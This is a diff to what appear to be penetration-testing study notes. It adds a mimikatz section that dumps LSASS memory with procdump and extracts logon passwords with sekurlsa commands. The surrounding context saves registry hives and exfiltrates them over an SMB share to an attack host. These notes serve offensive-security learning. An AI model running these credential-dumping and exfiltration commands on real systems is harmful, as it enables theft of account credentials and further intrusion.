@@ -45,6 +45,20 @@ C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 The operation completed successfully.
 ```
 
+#### Using mimikatz
+
+```powershell
+# LSASS DUMP
+C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+# DISPLAY DUMP
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to minidump
+
+mimikatz # sekurlsa::logonPasswords
+<....>
+```
+
 #### Creating a Share with smbserver.py
 * All we must do to create the share is run smbserver.py -smb2support usingPpython, give the share a name (`CompData`) and specify the directory on our attack host where the share will be storing the hive copies (`/home/ltnbob/Documents`)
 * Know that the `smb2support` option will ensure that newer versions of SMB are supported, without the use it will error out
